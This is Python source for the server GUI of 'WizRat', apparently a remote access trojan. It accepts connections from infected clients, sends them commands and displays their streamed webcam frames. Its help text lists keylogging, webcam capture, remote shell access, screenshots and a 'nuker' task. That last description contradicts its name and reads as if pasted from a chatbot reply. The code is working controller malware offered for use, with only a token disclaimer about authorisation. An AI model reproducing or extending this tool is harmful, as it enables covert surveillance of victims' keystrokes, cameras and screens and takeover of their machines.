import tkinter as tk
from tkinter import ttk
import tkinter.font as tkFont
from tkinter import PhotoImage, scrolledtext, Entry, Button, Menu, messagebox, filedialog
from tkinter.font import Font
from PIL import Image
import time
import threading
import socket
import webbrowser
import signal
import atexit
import base64
import pickle
import struct
import cv2
from config import *


class ServerGUI:
    def __init__(self, host, port):
        self.is_running = False  # status flag
        self.camserver = None
        self.camserver_process = None

        self.host = host
        self.port = port

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))

        self.clients = []

        self.window = tk.Tk()
        self.window.title("WizRat Server")

        # Load icon from base64 string
        icon_data = base64.b64decode(ICON_BASE64)
        icon_image = PhotoImage(data=icon_data)
        self.window.iconphoto(False, icon_image)

        self.custom_font_size = 12  # Initial font size
        self.min_font_size = 8
        self.max_font_size = 24
        self.custom_font = Font(family="Monospace", size=self.custom_font_size)

        self.text_area = scrolledtext.ScrolledText(
            self.window,
            font=self.custom_font,
            bg="black",
            fg="#00FF00",
            wrap="word",
            insertbackground="white",
            insertwidth=2,
            padx=10,
            pady=10,
            highlightbackground="green",
            highlightcolor="green",
            state="disabled")

        self.text_area.pack(fill=tk.BOTH, expand=True)

        self.text_area.bind(
            "<Control-MouseWheel>",
            self.zoom_with_mouse_scroll)

        # Input Text and Send Button Frame START
        self.image_label = tk.Label(self.window)
        self.image_label.pack(fill=tk.BOTH, expand=True)

        input_frame = tk.Frame(self.window)
        input_frame.pack(fill=tk.X, padx=5, pady=5)
        self.input_entry = tk.Entry(
            input_frame,
            font=("Courier", 12),         # Clean, modern font

            insertbackground="#212529",   # Cursor color
            highlightthickness=2,
            highlightbackground="#ced4da",   # Normal border color
            highlightcolor="#66afe9"         # Border color when focused
        )
        self.input_entry.pack(
            side=tk.LEFT,
            fill=tk.X,
            expand=True,
            padx=(
                0,
                5),
            ipady=2)

        self.send_button = tk.Button(
            input_frame,
            text="[->] Send",                  # Unicode 'outbox tray' emoji
            command=self.send_message,
            width=12,
            font=("Segoe UI", 10, "bold"),
            bg="#0d6efd",                   # Bootstrap blue
            fg="white",
            activebackground="#0b5ed7",
            activeforeground="white",
            relief=tk.FLAT,
            cursor="hand2"
        )
        self.send_button.pack(side=tk.RIGHT)
        # Input Text and Send Button Frame END

        # Start/Stop Button Frame with Buttons START
        self.button_frame = tk.Frame(self.window)
        self.button_frame.pack(pady=10)

        style = ttk.Style()

        # Apply a default theme that supports styling
        style.theme_use("default")

        # Green Button (Start)
        style.configure("Green.TButton",
                        background="#28a745",    # Bootstrap green
                        foreground="white",
                        font=("Segoe UI", 10, "bold"),
                        borderwidth=1,
                        focusthickness=3,
                        focuscolor="none"
                        )
        style.map("Green.TButton",
                  background=[("active", "#218838"), ("disabled", "#a6d8b9")],
                  foreground=[("disabled", "white")]
                  )

        # Red Button (Stop)
        style.configure("Red.TButton",
                        background="#dc3545",    # Bootstrap red
                        foreground="white",
                        font=("Segoe UI", 10, "bold"),
                        borderwidth=1,
                        focusthickness=3,
                        focuscolor="none"
                        )
        style.map("Red.TButton",
                  background=[("active", "#c82333"), ("disabled", "#f5b5b8")],
                  foreground=[("disabled", "white")]
                  )

        # Create Buttons
        self.start_button = ttk.Button(
            self.button_frame,
            text="Start Server",
            command=self.start_server,
            style="Green.TButton"
        )
        self.start_button.pack(side=tk.LEFT, padx=10)

        self.stop_button = ttk.Button(
            self.button_frame,
            text="Stop Server",
            command=self.stop_server,
            style="Red.TButton",
            state=tk.DISABLED
        )
        self.stop_button.pack(side=tk.LEFT, padx=10)
        # Start/Stop Button Frame with Buttons END

        # Uncomment below to start cam server on program start
        # external_thread = threading.Thread(target=self.start_camserver)
        # external_thread.start()

        button_style_cam_ss = {
            "font": ("Segoe UI", 10, "bold"),
            "bg": "#0d6efd",               # Bootstrap blue
            "fg": "white",
            "activebackground": "#0b5ed7",
            "activeforeground": "white",
            "relief": tk.FLAT,
            "cursor": "hand2"
        }

        def on_enter(e):
            e.widget['bg'] = '#0b5ed7'  # hover color
            e.widget['fg'] = 'white'

        def on_leave(e):
            e.widget['bg'] = '#0d6efd'  # original color
            e.widget['fg'] = 'white'

        self.cam_button = Button(
            self.window,
            text="Show Cam",
            command=lambda: self.send_message("perform wstreamer"),
            **button_style_cam_ss
        )
        self.cam_button.pack(pady=8)
        self.cam_button.bind("<Enter>", on_enter)
        self.cam_button.bind("<Leave>", on_leave)

        self.screenshot_button = Button(
            self.window,
            text="Show Screenshot",
            command=self.show_screenshot,
            **button_style_cam_ss
        )
        self.screenshot_button.pack(pady=8)
        self.screenshot_button.bind("<Enter>", on_enter)
        self.screenshot_button.bind("<Leave>", on_leave)

        # Menu Bar START
        menu_font = tkFont.Font(family="Segoe UI", size=10)
        self.menu_bar = Menu(self.window, font=menu_font)
        self.window.config(menu=self.menu_bar)

        # File menu
        self.file_menu = Menu(self.menu_bar, tearoff=0, font=menu_font)
        self.menu_bar.add_cascade(label="File", menu=self.file_menu)
        self.file_menu.add_command(
            label="Save",
            command=self.save_to_file,
            accelerator="Ctrl+S")
        self.file_menu.add_command(
            label="Load",
            command=self.load_from_file,
            accelerator="Ctrl+O")
        self.file_menu.add_separator()
        self.file_menu.add_command(
            label="Clear",
            command=self.clear_text_area,
            accelerator="Ctrl+K")
        self.file_menu.add_command(
            label="New Output Area",
            command=self.new_text_area)
        self.file_menu.add_command(
            label="Reset Connection",
            command=self.reset_connection)
        self.file_menu.add_separator()
        self.file_menu.add_command(
            label="Exit",
            command=self.window.quit,
            accelerator="Ctrl+Q")

        # Help menu
        self.help_menu = Menu(self.menu_bar, tearoff=0, font=menu_font)
        self.menu_bar.add_cascade(label="Help", menu=self.help_menu)
        self.help_menu.add_command(
            label="Command List",
            command=self.show_command_list)
        self.help_menu.add_command(label="About", command=self.show_about)

        # View menu
        self.view_menu = Menu(self.menu_bar, tearoff=0, font=menu_font)
        self.menu_bar.add_cascade(label="View", menu=self.view_menu)
        self.view_menu.add_command(
            label="Zoom In",
            command=self.zoom_in,
            accelerator="Ctrl+")
        self.view_menu.add_command(
            label="Zoom Out",
            command=self.zoom_out,
            accelerator="Ctrl+")
        self.view_menu.add_separator()
        self.view_menu.add_command(
            label="Reset View",
            command=self.reset_view,
            accelerator="Ctrl+R")

        # Bind shortcuts
        self.window.bind_all("<Control-s>", lambda e: self.save_to_file())
        self.window.bind_all("<Control-o>", lambda e: self.load_from_file())
        self.window.bind_all("<Control-k>", lambda e: self.clear_text_area())
        self.window.bind_all("<Control-q>", lambda e: self.window.quit())
        self.window.bind_all("<Control-plus>", lambda e: self.zoom_in())
        self.window.bind_all("<Control-minus>", lambda e: self.zoom_out())
        self.window.bind_all("<Control-r>", lambda e: self.reset_view())
        # Menu Bar END

        self.screen_label = tk.Label(self.window)
        self.screen_label.pack()

        self.screener_active = False
        self.screener_thread = None

        # Register cleanup handlers for external closure
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
        atexit.register(self.close_server)

        # Bind the window closing event to the cleanup method
        self.window.protocol("WM_DELETE_WINDOW", self.close_server)

    def _signal_handler(self, signum, frame):
        """Handle external closure signals"""
        print(f"\nReceived signal {signum}. Closing server...")
        self.close_server()

    def start_server(self):
        self.start_button.config(state=tk.DISABLED)  # Disable start button
        self.stop_button.config(state=tk.NORMAL)     # Enable stop button
        self.server_socket.listen(5)
        self.is_running = True  # Set flag to True when starting

        external_thread = threading.Thread(target=self.start_camserver)
        external_thread.start()

        # Insert styled title
        self.text_area.config(state="normal")
        self.text_area.insert(tk.END, "        ", "default")  # some spacing
        self.text_area.insert(tk.END, "WizRat\n", "title")
        self.text_area.insert(tk.END, "by Bitmutex Technologies\n", "subtitle")

        # Add server info
        server_info = f"\nServer Information:\n"
        server_info += f"IP Address: {self.host}\n"
        server_info += f"Port: {self.port}\n"
        self.text_area.insert(tk.END, server_info, "server_info")

        self.text_area.insert(
            tk.END,
            "\nMain Server started. Listening for connections...\n",
            "default")
        self.text_area.config(state="disabled")

        # Add styling tags
        self.text_area.tag_config(
            "title",
            foreground="#00FFFF",
            background="black",
            font=(
                "Courier",
                40,
                "bold"))
        self.text_area.tag_config(
            "subtitle",
            foreground="#00FF00",
            background="black",
            font=(
                "Courier",
                10,
                "italic"))
        self.text_area.tag_config(
            "default",
            foreground="#00FF00",
            background="black")
        self.text_area.tag_config(
            "server_info",
            foreground="#FFFF00",
            background="black",
            font=(
                "Courier",
                12))

        self.text_area.see(tk.END)  # Scroll to the end

        threading.Thread(target=self.accept_clients).start()

    def start_camserver(self):
        try:
            self.camserver = CamServer(CAM_SERVER_IP, CAM_SERVER_PORT)
            if self.camserver.start():
                wstr = "Wstreamer Cam Server Started...\nSend 'perform wstreamer' or Click `Show Cam` to start streaming.\n"
                print(wstr)
                self.update_text_area(wstr)
            else:
                raise RuntimeError("Failed to start camera server")
        except Exception as e:
            error_str = f"Failed to start camera server: {str(e)}\n"
            print(error_str)
            self.update_text_area(error_str)
        finally:
            self.text_area.see(tk.END)

    def show_screenshot(self):
        try:
            im = Image.open("monitor-1.png")
            self.update_text_area("Screenshot Opened\n")
            im.show()
        except FileNotFoundError:
            self.update_text_area(
                "Error: Screenshot file not found please send perform screener and try again\n")

    def accept_clients(self):
        while self.is_running:  # Use flag in the loop
            try:
                # Add timeout to allow checking flag
                self.server_socket.settimeout(1)
                client_socket, client_address = self.server_socket.accept()
                self.clients.append(client_socket)
                self.update_text_area(
                    f"Client connected: {
                        client_address[0]}:{
                        client_address[1]}\n")
                self.update_client_list()
                threading.Thread(
                    target=self.receive_data, args=(
                        client_socket,)).start()
            except socket.timeout:
                continue  # Continue checking the flag
            except Exception as e:
                if self.is_running:  # Only show error if we're supposed to be running
                    self.update_text_area(f"Accept error: {str(e)}\n")
                break

    def receive_data(self, client_socket):
        while True:
            try:
                data = client_socket.recv(1024).decode("utf-8")
                if not data:
                    self.remove_client(client_socket)
                    break

                self.update_text_area(
                    f"Received from {
                        client_socket.getpeername()}: {data}\n")
                self.text_area.see(tk.END)  # Scroll to the end
            except Exception as e:
                self.update_text_area(tk.END, f"Error: " + str(e))
                self.text_area.see(tk.END)  # Scroll to the end
                self.remove_client(client_socket)
                break

    def send_message(self, message=None):
        if message is None:
            message = self.input_entry.get()

        if message:
            self.input_entry.delete(0, tk.END)
            self.update_text_area(f"Server: {message}\n")
            self.text_area.see(tk.END)  # Scroll to the end

            # copy to avoid modification during iteration
            for client_socket in self.clients[:]:
                try:
                    client_socket.send(message.encode("utf-8"))
                except Exception as e:
                    self.update_text_area(f"Error: {str(e)}")
                    self.text_area.see(tk.END)
                    self.remove_client(client_socket)

    def remove_client(self, client_socket):
        client_socket.close()
        self.clients.remove(client_socket)
        self.update_client_list()
        self.update_text_area("Client disconnected.\n")

    def update_client_list(self):
        self.text_area.delete(1.0, tk.END)
        self.update_text_area("Connected Clients:\n")
        for idx, client_socket in enumerate(self.clients, start=1):
            client_address = client_socket.getpeername()
            self.update_text_area(
                f"{idx}. {
                    client_address[0]}:{
                    client_address[1]}\n")

    def clear_text_area(self):
        self.text_area.config(state="normal")
        self.text_area.delete(1.0, tk.END)
        self.text_area.config(state="disabled")

    def new_text_area(self):
        self.text_area.destroy()  # Destroy the existing text area widget
        self.text_area = scrolledtext.ScrolledText(
            self.window)  # Create a new text area widget
        self.text_area.pack(fill=tk.BOTH, expand=True)

    def reset_connection(self):
        for client_socket in self.clients:
            client_socket.close()
        self.clients = []

        self.update_text_area("Existing client connections closed.\n")

        # Close the server socket
        self.server_socket.close()
        self.update_text_area("Server socket closed.\n")

        # Create a new server socket and start accepting clients again
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)

        self.update_text_area(
            "Server socket reopened. Listening for connections...\n")

        threading.Thread(target=self.accept_clients).start()

    def show_command_list(self):
        command_list = """
                Tasks and Commands:

                Hello Task:

                Command: perform hello
                Description: Returns a greeting message from the client to the server.
                Show OS Information Task:

                Command: perform show_os_info
                Description: Retrieves and returns information about the client's operating system.
                Show Hardware Information Task:

                Command: perform show_hw_info
                Description: Retrieves and returns information about the client's hardware (CPU, RAM, Disk).
                Keylogging Task:

                Command: perform kstreamer
                Description: Starts capturing and sending keypress events to the server.
                Webcam Streaming Task:

                Command: perform wstreamer
                Description: Starts streaming webcam video from the client to the server.
                Shell Access Task:

                Command: perform sheller
                Description: Initiates a shell session on the client where the server can send commands to execute.
                Stop Task:

                Command: perform stop
                Description: Stops ongoing tasks such as keylogging, webcam streaming, and shell access.
                Screen Sharing Task:

                Command: perform screener
                Description: Takes a screenshot of the client's screen and sends it to the server.
                Nuker Task (For demonstration purposes only):

                Command: perform nuker
                Description: Initiates a screen sharing feature, sending continuous screenshots to the server.
                Please note that tasks such as "Nuker" or "Screen Sharing" might have significant security and ethical implications, especially in a real-world scenario. Use such features responsibly and only with proper authorization and consent. The descriptions provided above are based on the context of your previous questions and may not cover all the details of each task's functionality.
                """
        messagebox.showinfo("Command List", command_list)

    def show_about(self):
        about_dialog = AboutDialog(self.window)

    def save_to_file(self):
        content = self.text_area.get(1.0, tk.END)
        file_path = filedialog.asksaveasfilename(
            defaultextension=".wrat", filetypes=[
                ("Wizrat Files", "*.wrat")])

        if file_path:
            with open(file_path, "w") as f:
                f.write(content)

    def update_text_area(self, text):
        self.text_area.config(state="normal")
        self.text_area.insert(tk.END, text)
        self.text_area.config(state="disabled")

    def load_from_file(self):
        file_path = filedialog.askopenfilename(
            filetypes=[("Wizrat Files", "*.wrat")])
        if file_path:
            with open(file_path, "r") as f:
                content = f.read()
                self.text_area.config(state="normal")
                self.text_area.delete(1.0, tk.END)  # Clear existing content
                self.update_text_area(content)

    def zoom_in(self):
        if self.custom_font_size < self.max_font_size:
            self.custom_font_size += 2
            self.update_font()

    def zoom_out(self):
        if self.custom_font_size > self.min_font_size:
            self.custom_font_size -= 2
            self.update_font()

    def reset_view(self):
        self.custom_font_size = 12
        self.update_font()

    def update_font(self):
        self.custom_font.configure(size=self.custom_font_size)
        self.text_area.configure(font=self.custom_font)

    def zoom_with_mouse_scroll(self, event):
        if event.state == 4:  # Control key is pressed
            if event.delta > 0:
                self.zoom_in()
            elif event.delta < 0:
                self.zoom_out()

    def stop_server(self):
        self.is_running = False
        self.stop_button.config(state=tk.DISABLED)  # Disable stop button
        self.start_button.config(state=tk.NORMAL)   # Enable start button

        # Stop camera server first
        if self.camserver:
            try:
                self.camserver.stop()
            except Exception as e:
                print(f"Error stopping camera server: {e}")
            self.camserver = None

        # Close all client connections
        for client_socket in self.clients:
            try:
                client_socket.close()
            except BaseException:
                pass
        self.clients.clear()

        self.update_text_area("Server stopped.\n")

        # Close the server socket
        try:
            self.server_socket.close()
        except BaseException:
            pass

        # Terminate camserver  if it's running
        if self.camserver:
            self.camserver.stop()
            self.camserver = None

        # Create new socket for next start
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))

        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

        self.update_text_area("Server socket closed.\n")

    def run(self):
        self.window.mainloop()

    # Cleanup method for graceful shutdown
    def close_server(self):
        """Enhanced cleanup method"""
        print("Performing cleanup operations...")
        try:
            # Stop the server first
            self.stop_server()
        except Exception as e:
            print(f"Error during server shutdown: {e}")

        try:
            # Destroy the window if it exists and is alive
            if self.window and self.window.winfo_exists():
                self.window.quit()
                self.window.destroy()
        except Exception as e:
            print(f"Error destroying window: {e}")

        # Force exit in case of hanging
        import os
        os._exit(0)


class AboutDialog(tk.Toplevel):
    def __init__(self, parent):
        super().__init__(parent)
        self.title("About")

        self.message_label = tk.Label(
            self, text="This is the Server GUI for WizRat application.\nVersion 0.6")
        self.message_label.pack(padx=10, pady=10)

        self.website_label = tk.Label(
            self,
            text="For more information, visit our website: www.bitmutex.com",
            cursor="hand2",
            fg="blue")
        self.website_label.pack(padx=10, pady=5)
        self.website_label.bind("<Button-1>", self.open_website)

        self.contact_label = tk.Label(
            self,
            text="Contact us - Send an Email",
            cursor="hand2",
            fg="blue")
        self.contact_label.pack(padx=10, pady=5)
        self.contact_label.bind("<Button-1>", self.open_email)

    def open_website(self, event):
        webbrowser.open("https://www.bitmutex.com")

    def open_email(self, event):
        webbrowser.open("mailto:amitnandileo@gmail.com")


class CamServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.running = False
        self.connection = None
        self.thread = None

    def start(self):
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(10)
            print(f'Camserver Socket listening on {self.host}:{self.port}')
            self.running = True
            self.thread = threading.Thread(target=self.run)
            self.thread.daemon = True
            self.thread.start()
            return True
        except Exception as e:
            print(f"Failed to start camera server: {e}")
            return False

    def stop(self):
        try:
            self.running = False
            # Close connection first
            if self.connection:
                try:
                    self.connection.shutdown(socket.SHUT_RDWR)
                    self.connection.close()
                except BaseException:
                    pass
                self.connection = None

            # Then close server socket
            if self.socket:
                try:
                    self.socket.shutdown(socket.SHUT_RDWR)
                    self.socket.close()
                except BaseException:
                    pass
                self.socket = None

            cv2.destroyAllWindows()

            if self.thread and self.thread.is_alive():
                self.thread.join(timeout=1.0)  # Wait for thread to finish

        except Exception as e:
            print(f"Error during camera server shutdown: {e}")

    def run(self):
        try:
            while self.running:
                try:
                    print("Waiting for camera client connection...")
                    # Add timeout to allow checking running flag
                    self.socket.settimeout(1.0)
                    self.connection, addr = self.socket.accept()
                    print(f"Camera client connected from {addr}")

                    data = b""
                    payload_size = struct.calcsize(">L")
                    prev_time = time.time()

                    while self.running:
                        try:
                            # Read frame size
                            while len(data) < payload_size:
                                chunk = self.connection.recv(4096)
                                if not chunk:
                                    raise ConnectionError(
                                        "Client disconnected")
                                data += chunk

                            packed_msg_size = data[:payload_size]
                            data = data[payload_size:]
                            msg_size = struct.unpack(">L", packed_msg_size)[0]

                            # Read frame data
                            while len(data) < msg_size:
                                chunk = self.connection.recv(4096)
                                if not chunk:
                                    raise ConnectionError(
                                        "Client disconnected")
                                data += chunk

                            frame_data = data[:msg_size]
                            data = data[msg_size:]

                            # Process frame
                            frame = pickle.loads(
                                frame_data, fix_imports=True, encoding="bytes")
                            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)

                            # Calculate and display FPS
                            current_time = time.time()
                            fps = 1 / (current_time - prev_time)
                            prev_time = current_time

                            cv2.putText(
                                frame,
                                f"FPS: {fps:.2f}",
                                org=(10, 25),
                                fontFace=cv2.FONT_HERSHEY_SIMPLEX,
                                fontScale=0.6,
                                color=(255, 255, 255),
                                thickness=1,
                                lineType=cv2.LINE_AA
                            )

                            # Show frame
                            cv2.imshow('WizRat Camera Server', frame)

                            # Check for exit conditions
                            key = cv2.waitKey(1) & 0xFF
                            if (key == 27 or  # ESC key
                                key == ord('q') or  # q key
                                    # Window closed
                                    cv2.getWindowProperty('WizRat Camera Server', cv2.WND_PROP_VISIBLE) < 1):
                                break

                        except ConnectionError as e:
                            print(f"Connection error: {e}")
                            break
                        except Exception as e:
                            print(f"Error processing frame: {e}")
                            continue

                except socket.timeout:
                    if not self.running:
                        break
                    continue
                except Exception as e:
                    print(f"Error accepting connection: {e}")
                    if not self.running:
                        break
                    time.sleep(1)  # Wait before retrying
                finally:
                    if self.connection:
                        try:
                            self.connection.close()
                            self.connection = None
                        except BaseException:
                            pass
                    cv2.destroyAllWindows()
                    data = b""  # Reset data buffer for next connection

        except Exception as e:
            print(f"Camera server error: {e}")
        finally:
            if self.connection:
                try:
                    self.connection.close()
                except BaseException:
                    pass
            cv2.destroyAllWindows()
            print("Camera server stopped")


if __name__ == "__main__":
    server = ServerGUI(SERVER_IP, SERVER_PORT)
    server.run()
